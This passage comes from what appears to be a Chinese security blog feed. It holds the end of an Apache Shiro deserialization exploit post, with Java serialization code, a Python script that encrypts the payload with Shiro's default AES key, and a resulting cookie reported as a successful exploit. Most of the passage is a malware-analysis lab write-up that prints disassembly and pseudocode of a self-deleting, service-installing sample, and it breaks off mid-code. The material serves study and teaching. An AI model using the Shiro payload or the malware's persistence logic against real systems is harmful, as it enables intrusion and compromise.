class="number">1</span>);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        <span class="comment">//unSerialize(&quot;ser.bin&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">ooStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        ooStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unSerialize</span><span class="params">(String fileName)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oiStrean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(fileName));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> oiStrean.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>python加密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert_bin</span>(<span class="params">file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AES_enc</span>(<span class="params">data</span>):</span><br><span class="line">    BS=AES.block_size</span><br><span class="line">    pad=<span class="keyword">lambda</span> s:s+((BS-<span class="built_in">len</span>(s)%BS)*<span class="built_in">chr</span>(BS-<span class="built_in">len</span>(s)%BS)).encode()</span><br><span class="line">    key=<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode=AES.MODE_CBC</span><br><span class="line">    iv=uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor=AES.new(base64.b64decode(key),mode,iv)</span><br><span class="line">    ciphertext=base64.b64encode(iv+encryptor.encrypt(pad(data)))</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    data=convert_bin(<span class="string">&quot;ser.bin&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(AES_enc(data))</span><br><span class="line"></span><br><span class="line">结果：</span><br><span class="line">LPWtx1kiT9aPgmH56vw8ertCoG8oAFBmIu3ZtNyaoQtCK9vOekQ4Tx4dKtoxKOsRizCxYoIlWHkHJqvzIZQ5YpgqYEoUVEVqExcCH5xVfbgQD12/ge8euUyZiwIXNouGyO4GbSYEdenS437PYmBvIhQqh3nUrY1KKoVRPOb+F0FxWe9cYXHO/QXvPoLAwIyO/YQte8bW02bYOA26SSKbMLQ4glOTf52JbwLkVB6Shfc4ylY8kDEx34F/E2pwDMk1JNbQfDoUVUAYTN4JEcr4MidEZm5m/1pPnXvvF00A+m+h5ajsDrRRBnOGiqZb6FdHmyh1tA/KUcFMtS29hiEMwDqne0J/9keqnz+9216OF35lWkGcwrOxo7Kab1XCJwM2OR8clh8EtGjO4SQPixNemLcaAPMD23yj5u7d/6EpqmyQ01/93kzt6ATeIjahg9ftNrly9P5oFpF383710PONt5bA80uFU9NY9PRAGstfoITH1hvXynn76HdD3qCZxrqGyP11eQlU1sKByp1ncS9Pqg==</span><br></pre></td></tr></table></figure></li><li><p>抓包该cookie，利用成功</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830165338912.png" alt="image-20220830165338912"></p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Shiro&quot;&gt;&lt;a href=&quot;#Shiro&quot; class=&quot;headerlink&quot; title=&quot;Shiro&quot;&gt;&lt;/a&gt;Shiro&lt;/h2&gt;&lt;h4 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;</summary>
      
    
    
    
    <category term="java安全" scheme="http://example.com/categories/java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="java安全" scheme="http://example.com/tags/java%E5%AE%89%E5%85%A8/"/>
    
    <category term="java框架" scheme="http://example.com/tags/java%E6%A1%86%E6%9E%B6/"/>
    
  </entry>
  
  <entry>
    <title>恶意代码分析lab9-1</title>
    <link href="http://example.com/2022/08/06/lab9-1/"/>
    <id>http://example.com/2022/08/06/lab9-1/</id>
    <published>2022-08-06T13:16:50.000Z</published>
    <updated>2022-09-01T00:52:23.531Z</updated>
    
    <content type="html"><![CDATA[<h2 id="纵观"><a href="#纵观" class="headerlink" title="纵观"></a>纵观</h2><h2 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h2><ol><li><p>打开程序观察堆栈发现并不是main函数入口点<br> <img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220824130648845.png" alt="image-20220824130648845"></p></li><li><p>利用ida分析main函数地址，并在od中断点<br> <img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220824130710216.png" alt="image-20220824130710216"><br> <img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220824130728703.png" alt="image-20220824130728703"></p></li><li><p>一步一步跟进调试<br> <img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220824130742818.png" alt="image-20220824130742818"></p></li><li><p>查看参数个数是否为1，继续向下直接call 401000</p><p> <img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220824130755971.png" alt="image-20220824130755971"></p></li><li><p>代码太长不好截图，直接放代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">.text:00402410                 push    ebp</span><br><span class="line">.text:00402411                 mov     ebp, esp</span><br><span class="line">.text:00402413                 sub     esp, 208h</span><br><span class="line">.text:00402419                 push    ebx</span><br><span class="line">.text:0040241A                 push    esi</span><br><span class="line">.text:0040241B                 push    edi</span><br><span class="line">.text:0040241C                 push    104h            ; nSize</span><br><span class="line">.text:00402421                 lea     eax, [ebp+Filename]</span><br><span class="line">.text:00402427                 push    eax             ; lpFilename</span><br><span class="line">.text:00402428                 push    0               ; hModule</span><br><span class="line">.text:0040242A                 call    ds:GetModuleFileNameA</span><br><span class="line">.text:00402430                 push    104h            ; cchBuffer</span><br><span class="line">.text:00402435                 lea     ecx, [ebp+Filename]</span><br><span class="line">.text:0040243B                 push    ecx             ; lpszShortPath</span><br><span class="line">.text:0040243C                 lea     edx, [ebp+Filename]</span><br><span class="line">.text:00402442                 push    edx             ; lpszLongPath</span><br><span class="line">.text:00402443                 call    ds:GetShortPathNameA</span><br><span class="line">.text:00402449                 mov     edi, offset aCDel ; &quot;/c del &quot;</span><br><span class="line">.text:0040244E                 lea     edx, [ebp+Parameters]</span><br><span class="line">.text:00402454                 or      ecx, 0FFFFFFFFh</span><br><span class="line">.text:00402457                 xor     eax, eax</span><br><span class="line">.text:00402459                 repne scasb</span><br><span class="line">.text:0040245B                 not     ecx</span><br><span class="line">.text:0040245D                 sub     edi, ecx</span><br><span class="line">.text:0040245F                 mov     esi, edi</span><br><span class="line">.text:00402461                 mov     eax, ecx</span><br><span class="line">.text:00402463                 mov     edi, edx</span><br><span class="line">.text:00402465                 shr     ecx, 2</span><br><span class="line">.text:00402468                 rep movsd</span><br><span class="line">.text:0040246A                 mov     ecx, eax</span><br><span class="line">.text:0040246C                 and     ecx, 3</span><br><span class="line">.text:0040246F                 rep movsb</span><br><span class="line">.text:00402471                 lea     edi, [ebp+Filename]</span><br><span class="line">.text:00402477                 lea     edx, [ebp+Parameters]</span><br><span class="line">.text:0040247D                 or      ecx, 0FFFFFFFFh</span><br><span class="line">.text:00402480                 xor     eax, eax</span><br><span class="line">.text:00402482                 repne scasb</span><br><span class="line">.text:00402484                 not     ecx</span><br><span class="line">.text:00402486                 sub     edi, ecx</span><br><span class="line">.text:00402488                 mov     esi, edi</span><br><span class="line">.text:0040248A                 mov     ebx, ecx</span><br><span class="line">.text:0040248C                 mov     edi, edx</span><br><span class="line">.text:0040248E                 or      ecx, 0FFFFFFFFh</span><br><span class="line">.text:00402491                 xor     eax, eax</span><br><span class="line">.text:00402493                 repne scasb</span><br><span class="line">.text:00402495                 add     edi, 0FFFFFFFFh</span><br><span class="line">.text:00402498                 mov     ecx, ebx</span><br><span class="line">.text:0040249A                 shr     ecx, 2</span><br><span class="line">.text:0040249D                 rep movsd</span><br><span class="line">.text:0040249F                 mov     ecx, ebx</span><br><span class="line">.text:004024A1                 and     ecx, 3</span><br><span class="line">.text:004024A4                 rep movsb</span><br><span class="line">.text:004024A6                 mov     edi, offset aNul ; &quot; &gt;&gt; NUL&quot;</span><br><span class="line">.text:004024AB                 lea     edx, [ebp+Parameters]</span><br><span class="line">.text:004024B1                 or      ecx, 0FFFFFFFFh</span><br><span class="line">.text:004024B4                 xor     eax, eax</span><br><span class="line">.text:004024B6                 repne scasb</span><br><span class="line">.text:004024B8                 not     ecx</span><br><span class="line">.text:004024BA                 sub     edi, ecx</span><br><span class="line">.text:004024BC                 mov     esi, edi</span><br><span class="line">.text:004024BE                 mov     ebx, ecx</span><br><span class="line">.text:004024C0                 mov     edi, edx</span><br><span class="line">.text:004024C2                 or      ecx, 0FFFFFFFFh</span><br><span class="line">.text:004024C5                 xor     eax, eax</span><br><span class="line">.text:004024C7                 repne scasb</span><br><span class="line">.text:004024C9                 add     edi, 0FFFFFFFFh</span><br><span class="line">.text:004024CC                 mov     ecx, ebx</span><br><span class="line">.text:004024CE                 shr     ecx, 2</span><br><span class="line">.text:004024D1                 rep movsd</span><br><span class="line">.text:004024D3                 mov     ecx, ebx</span><br><span class="line">.text:004024D5                 and     ecx, 3</span><br><span class="line">.text:004024D8                 rep movsb</span><br><span class="line">.text:004024DA                 push    0               ; nShowCmd</span><br><span class="line">.text:004024DC                 push    0               ; lpDirectory</span><br><span class="line">.text:004024DE                 lea     eax, [ebp+Parameters]</span><br><span class="line">.text:004024E4                 push    eax             ; lpParameters</span><br><span class="line">.text:004024E5                 push    offset File     ; &quot;cmd.exe&quot;</span><br><span class="line">.text:004024EA                 push    0               ; lpOperation</span><br><span class="line">.text:004024EC                 push    0               ; hwnd</span><br><span class="line">.text:004024EE                 call    ds:ShellExecuteA</span><br><span class="line">.text:004024F4                 push    0               ; int</span><br><span class="line">.text:004024F6                 call    _exit</span><br><span class="line">.text:004024F6 sub_402410      endp</span><br></pre></td></tr></table></figure><p>大体就是得到本地文件路径，拼凑字符串<br><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220824130811300.png" alt="image-20220824130811300"><br>在本地尝试可以看到此命令为删除指定路径的文件(怪不得每次点击exe文件就没了，还以为防火墙删了emm)<br><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220824130821549.png" alt="image-20220824130821549"><br>调用SHELL32的ShellExecute函数执行拼接的字符串，但由于已在od中打开，所以不会删除<br><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220824130926845.png" alt="image-20220824130926845"><br>接着往下看，传入参数-in后call 40380f</p></li></ol><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825161450107.png" alt="image-20220825161450107"> </p><p>在main函数中找到__mbscmp相关调用（call的40380f），此函数是比较字符串是否相等的</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220824131207556.png" alt="image-20220824131207556"> </p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220824131130609.png" alt="image-20220824131130609"> </p><p>此函数（40380f）的返回值为910000</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825163746134.png" alt="image-20220825163746134">  </p><p>可以看到参数-c -cc -re- in</p><table><thead><tr><th>参数</th><th>地址</th><th>功能</th></tr></thead><tbody><tr><td>-in</td><td>.text:00402600</td><td></td></tr><tr><td>-c</td><td></td><td></td></tr><tr><td>-cc</td><td>.text:0x401280</td><td></td></tr><tr><td>-re</td><td></td><td></td></tr></tbody></table><p>接着往下看，添加-in参数后Ctrl+F2重新调试</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220824132407112.png" alt="image-20220824132407112"></p><p>可见跳过删除自身，push参数call 402510</p><p>分析402510函数，发现对传入参数进行是否为abcd的校验</p><p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220824133448159.png" alt="image-20220824133448159"> </p><p>校验失败，call 402410函数，就是之前删除自身的函数</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220824133644854.png" alt="image-20220824133644854"> </p><p>改变参数为-in abcd，即可跳过</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220824133848104.png" alt="image-20220824133848104"> </p><p>call 0040380，ida分析为_mbscmp函数</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220824134418260.png" alt="image-20220824134418260"> </p><p>call 4025B0</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220824141400188.png" alt="image-20220824141400188"> </p><p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220824141515577.png" alt="image-20220824141515577"> </p><p>该函数作用为获取文件名且返回result&#x3D;0</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220824142219767.png" alt="image-20220824142219767"> </p><p>接着往下走，call 402600 应该是最重要的对应参数函数</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220824142336628.png" alt="image-20220824142336628"> </p><p>可以看到所传参数为4025B0的返回值（即当前文件文件名）</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825164520644.png" alt="image-20220825164520644"> </p><p>跟进后看到call了_alloca_probe（可能与注册内存有关，先不管）和4025b0（先前分析过为截取文件名）</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825165228995.png" alt="image-20220825165228995"> </p><p> 接着跟进发现跳转到402632，发现此函数前部分是实现拼接字符串%SYSTEMROOT%\system32\Lab09-01.exe的操作，然后调用OpenScManagerA</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825165810548.png" alt="image-20220825165810548"> </p><p>可以OpenScManagerA传入参数为3个立即数，之前分析知道它返回一个服务控制管理器句柄，所有要和服务交互的代码会调用这个函数；</p><p>对于这种官方API函数可以跳过</p><p>接着调用OpenService函数，参数为自身文件名，可以判断开启一个自身服务</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825170308202.png" alt="image-20220825170308202"> </p><p>接着调用ChangeServiceConfigA和CloseService函数</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825170611821.png" alt="image-20220825170611821"> </p><p>其中ChangeServiceConfigA所传参数如下，hService为之前开启的自身服务</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825170736958.png" alt="image-20220825170736958"> </p><p>再往下发现就跳出了402600函数，因此可以推断-in参数为创建服务功能，ida F5伪代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_402600</span><span class="params">(LPCSTR lpServiceName)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax@2</span></span><br><span class="line">  SC_HANDLE hService; <span class="comment">// [sp+Ch] [bp-1408h]@5</span></span><br><span class="line">  SC_HANDLE hServicea; <span class="comment">// [sp+Ch] [bp-1408h]@9</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [sp+10h] [bp-1404h]@1</span></span><br><span class="line">  CHAR Filename; <span class="comment">// [sp+410h] [bp-1004h]@14</span></span><br><span class="line">  CHAR DisplayName; <span class="comment">// [sp+810h] [bp-C04h]@9</span></span><br><span class="line">  CHAR BinaryPathName; <span class="comment">// [sp+C10h] [bp-804h]@6</span></span><br><span class="line">  SC_HANDLE hSCManager; <span class="comment">// [sp+1010h] [bp-404h]@3</span></span><br><span class="line">  CHAR Src; <span class="comment">// [sp+1014h] [bp-400h]@3</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( sub_4025B0(&amp;v4) ) </span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;Src, aSystemrootSyst);  <span class="comment">//aSystemrootSyst==%SYSTEMROOT%\system32\</span></span><br><span class="line"><span class="comment">  strcat(&amp;Src, &amp;v4);</span></span><br><span class="line">  <span class="built_in">strcat</span>(&amp;Src, a_exe);</span><br><span class="line">  hSCManager = OpenSCManagerA(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0xF003F</span>u);  <span class="comment">//调用OpenSCManagerA，打开一个服务管理器，</span></span><br><span class="line">  <span class="keyword">if</span> ( !hSCManager )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  hService = OpenServiceA(hSCManager, lpServiceName, <span class="number">0xF01FF</span>u); <span class="comment">//服务即自身exe，创建一个服务，</span></span><br><span class="line">  <span class="keyword">if</span> ( hService ) <span class="comment">//如果服务已经创建打开服务</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !ChangeServiceConfigA(hService, <span class="number">0xFFFFFFFF</span>, <span class="number">2u</span>, <span class="number">0xFFFFFFFF</span>, &amp;BinaryPathName, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) )</span><br><span class="line">    &#123;     <span class="comment">//并添加进启动项</span></span><br><span class="line">      CloseServiceHandle(hService);</span><br><span class="line">      CloseServiceHandle(hSCManager);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    CloseServiceHandle(hService);</span><br><span class="line">    CloseServiceHandle(hSCManager);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strcpy</span>(&amp;DisplayName, lpServiceName);</span><br><span class="line">    <span class="built_in">strcat</span>(&amp;DisplayName, aManagerService);  <span class="comment">//创建一个服务</span></span><br><span class="line">    hServicea = CreateServiceA(hSCManager, lpServiceName, &amp;DisplayName, <span class="number">0xF01FF</span>u, <span class="number">0x20</span>u, <span class="number">2u</span>, <span class="number">1u</span>, &amp;Src, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !hServicea )</span><br><span class="line">    &#123;</span><br><span class="line">      CloseServiceHandle(hSCManager);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    CloseServiceHandle(hServicea);</span><br><span class="line">    CloseServiceHandle(hSCManager);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( ExpandEnvironmentStringsA(&amp;Src, &amp;BinaryPathName, <span class="number">0x400</span>u) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( GetModuleFileNameA(<span class="number">0</span>, &amp;Filename, <span class="number">0x400</span>u) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( CopyFileA(&amp;Filename, &amp;BinaryPathName, <span class="number">0</span>) ) <span class="comment">//将自己复制到 %SYSTEMROOT%\\system32\\xxx，即写进system32目录</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( sub_4015B0(&amp;BinaryPathName) )</span><br><span class="line">          result = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          result = sub_401070(aUps, aHttpWww_practi, a80, a60) != <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        result = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到已启动自身服务</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220824143845843.png" alt="image-20220824143845843"> </p><p>至此，-in参数分析结束</p><p>接着分析-re参数</p><p>修改参数为-re abcd</p><p>经过_mbscmp函数后eax返回值为1，跳转到-re参数</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825171533060.png" alt="image-20220825171533060"> </p><p>接着和-in参数一样call 40380f比较字符串,call 4025b0获取文件名</p><p>接着call 402900进入-re参数函数</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825173245851.png" alt="image-20220825173245851"> </p><p>反汇编查看代码,初步判断为删除服务的，od跟进看看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_402900</span><span class="params">(LPCSTR lpServiceName)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax@2</span></span><br><span class="line">  SC_HANDLE hService; <span class="comment">// [sp+Ch] [bp-C08h]@3</span></span><br><span class="line">  <span class="type">char</span> v3; <span class="comment">// [sp+10h] [bp-C04h]@7</span></span><br><span class="line">  CHAR Dst; <span class="comment">// [sp+410h] [bp-804h]@9</span></span><br><span class="line">  SC_HANDLE hSCManager; <span class="comment">// [sp+810h] [bp-404h]@1</span></span><br><span class="line">  CHAR Src; <span class="comment">// [sp+814h] [bp-400h]@9</span></span><br><span class="line"></span><br><span class="line">  hSCManager = OpenSCManagerA(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0xF003F</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( hSCManager )</span><br><span class="line">  &#123;</span><br><span class="line">    hService = OpenServiceA(hSCManager, lpServiceName, <span class="number">0xF01FF</span>u);</span><br><span class="line">    <span class="keyword">if</span> ( hService )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( DeleteService(hService) )</span><br><span class="line">      &#123;</span><br><span class="line">        CloseServiceHandle(hSCManager);</span><br><span class="line">        CloseServiceHandle(hService);</span><br><span class="line">        <span class="keyword">if</span> ( sub_4025B0(&amp;v3) )</span><br><span class="line">        &#123;</span><br><span class="line">          result = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">strcpy</span>(&amp;Src, aSystemrootSyst);</span><br><span class="line">          <span class="built_in">strcat</span>(&amp;Src, &amp;v3);</span><br><span class="line">          <span class="built_in">strcat</span>(&amp;Src, a_exe);</span><br><span class="line">          <span class="keyword">if</span> ( ExpandEnvironmentStringsA(&amp;Src, &amp;Dst, <span class="number">0x400</span>u) )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( DeleteFileA(&amp;Dst) )</span><br><span class="line">            &#123;</span><br><span class="line">              